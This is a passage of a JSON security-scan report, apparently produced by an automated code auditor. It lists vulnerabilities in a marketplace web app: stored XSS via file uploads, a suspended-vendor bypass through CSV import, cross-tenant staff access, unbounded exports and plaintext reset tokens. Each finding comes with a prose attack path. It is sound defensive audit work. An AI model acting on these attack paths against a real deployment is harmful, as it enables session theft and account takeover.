+          "citation": "return FileResponse(path, media_type=att.content_type, filename=att.original_name)",
+          "proof": "SOURCE: `att.content_type` (originally `upload.content_type` from the upload HTTP request, stored unvalidated) -> SINK: passed as `media_type` to FileResponse. Combined with unvalidated file content (services.py:200-210 writes raw bytes), an attacker can upload a file containing JavaScript with Content-Type: text/html. Any user who opens the download link renders the attacker's HTML/JS in the marketplace origin, enabling session theft, CSRF, or defacement."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "app/services.py",
+      "start": {
+        "line": 234
+      },
+      "end": {
+        "line": 234
+      },
+      "extra": {
+        "message": "Suspended Vendor Bypass: CSV Bulk Import Missing Vendor Status Check",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def import_products_csv(db: Session, user: User, text: str) -> int:\n    if user.role != Role.vendor_manager or not user.vendor_id:\n        raise HTTPException(status_code=403, detail=\"Only vendor managers can import products\")",
+          "proof": "The `import_products` endpoint (main.py:477) calls `import_products_csv` which only checks `user.role == vendor_manager` and `user.vendor_id is not None`. It does NOT check whether the vendor is suspended (`VendorStatus.suspended`). Compare with `create_product` (main.py:168-170) which explicitly validates `vendor.status == VendorStatus.suspended` and blocks creation. A vendor_manager whose vendor has been suspended can bypass the suspension by using the CSV bulk-import endpoint to create unlimited products."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-789",
+      "path": "app/main.py",
+      "start": {
+        "line": 496
+      },
+      "end": {
+        "line": 496
+      },
+      "extra": {
+        "message": "Unbounded Memory Allocation in Export Endpoints (Memory Exhaustion DoS)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-789"
+          ],
+          "citation": "rows = [{\"id\": o.id, ...} for o in db.scalars(stmt)]",
+          "proof": "The GET /api/export/{kind} endpoint at line 484 accepts `kind` (orders/inventory/payouts/disputes) and loads every record from the corresponding table into a Python list with no .limit() or pagination. Lines 496 (orders), 502 (inventory), 505 (payouts), 508 (disputes) all use `db.scalars(stmt)` -> list comprehension, materializing ALL rows in memory. For 'orders', joinedload on vendor/buyer/items further multiplies memory. An attacker with vendor_manager or marketplace_admin role can request exports to cause OOM crash. All other list endpoints in the app use .limit(N), making the absence here a clear exception."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-789",
+      "path": "app/main.py",
+      "start": {
+        "line": 424
+      },
+      "end": {
+        "line": 424
+      },
+      "extra": {
+        "message": "Unbounded Results in Admin Users List (Memory Exhaustion DoS)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-789"
+          ],
+          "citation": "return [serialize_user(u) for u in db.scalars(select(User).order_by(User.created_at.desc())).all()]",
+          "proof": "Admin-triggered request to GET /api/admin/users -> SINK: select(User)...all() loads every user row into a Python list with no .limit() or pagination. While admin-only, a compromised admin account or internal tester can trigger OOM by requesting this endpoint against a large user table. All other list endpoints in the app use .limit(N), making this the only unbounded table scan on a user-facing endpoint."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "app/main.py",
+      "start": {
+        "line": 331
+      },
+      "end": {
+        "line": 331
+      },
+      "extra": {
+        "message": "Cross-Tenant Dispute Detail Access via Missing Scope Check for Staff Roles",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "if user.role == Role.buyer:\n        filters.append(Dispute.buyer_id == user.id)\n    elif user.role == Role.vendor_manager:\n        filters.append(Dispute.vendor_id == user.vendor_id)",
+          "proof": "Staff role (support_agent, marketplace_admin) requests to GET /api/disputes (line 327) and GET /api/disputes/{dispute_id} (line 343) apply no tenant-scope filter for staff roles; they see ALL disputes across all vendors/buyers. The assert_dispute_access function (services.py:119) returns immediately for ANY staff role without checking if the staff user is assigned to that dispute. Without an assignment/ownership model, a support_agent can enumerate, read messages, and view internal notes on disputes involving any vendor (cross-tenant information disclosure)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "app/main.py",
+      "start": {
+        "line": 300
+      },
+      "end": {
+        "line": 300
+      },
+      "extra": {
+        "message": "Cross-Vendor Review Moderation via Missing Vendor-Assignment Check",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "def moderate_review(review_id: int, state: ModerationState, user: User = Depends(require_roles(Role.marketplace_admin, Role.support_agent)), db: Session = Depends(get_db)):",
+          "proof": "Staff request with review_id + state query param -> SINK: `r.moderation_state = state` at line 304. The endpoint requires marketplace_admin or support_agent roles but performs no check on whether the moderator is assigned to the vendor whose product the review belongs to. A support_agent can moderate (approve/flag/reject) reviews for any product from any vendor across the platform with no per-vendor assignment check."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "app/main.py",
+      "start": {
+        "line": 77
+      },
+      "end": {
+        "line": 77
+      },
+      "extra": {
+        "message": "Plaintext Storage of Password Reset Token in Database",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "user.password_reset_token = make_reset_token()",
+          "proof": "UNTRUSTED SOURCE: make_reset_token() generates a cryptographically random token (secrets.token_urlsafe(32)) -> SINK: Stored directly into the User.password_reset_token column (models.py:78) as plaintext with no hashing. If the database is compromised via SQL injection, backup exposure, or insider access, attackers can read all outstanding reset tokens and take over any account. Per OWASP ASVS V2.5.1, reset tokens must be stored hashed like passwords."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 496
+      },
+      "end": {
+        "line": 496
+      },
+      "extra": {
+        "message": "Unbounded Row Fetch in Export Endpoint \u2014 Memory Exhaustion DoS",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "rows = [{\"id\": o.id, \"vendor\": o.vendor.name, \"buyer\": o.buyer.email, \"status\": o.status.value, \"total_cents\": o.total_cents, \"created_at\": o.created_at.isoformat()} for o in db.scalars(stmt)]",
+          "proof": "UNTRUSTED SOURCE: The export endpoint (/api/export/{kind}) accepts kind=orders|inventory|payouts|disputes -> SINK: db.scalars(stmt) loads ALL matching rows into memory with no .limit(). Vendor managers can trigger orders/inventory exports scoped to their vendor; a vendor with millions of orders can exhaust server memory. The same pattern repeats at lines 502 (inventory), 505 (payouts/admin-only), and 508 (disputes/admin-only)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 465
+      },
+      "end": {
+        "line": 465
+      },
+      "extra": {
+        "message": "Unbounded Row Fetch in Payouts Endpoint \u2014 Memory Exhaustion DoS",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "return [{\"id\": p.id, \"vendor\": p.vendor.name, \"amount_cents\": p.amount_cents, \"amount\": money(p.amount_cents), \"status\": p.status.value, \"masked_destination\": p.masked_destination} for p in db.scalars(stmt.order_by(Payout.created_at.desc()))]",
+          "proof": "UNTRUSTED SOURCE: The /api/payouts endpoint is accessible to vendor_managers (filtered to their vendor_id) -> SINK: db.scalars(stmt.order_by(...)) loads ALL matching payout rows into memory with no .limit(). A vendor with a long payout history can cause server memory exhaustion."
+        }
+      }
+    }
+  ]
+}
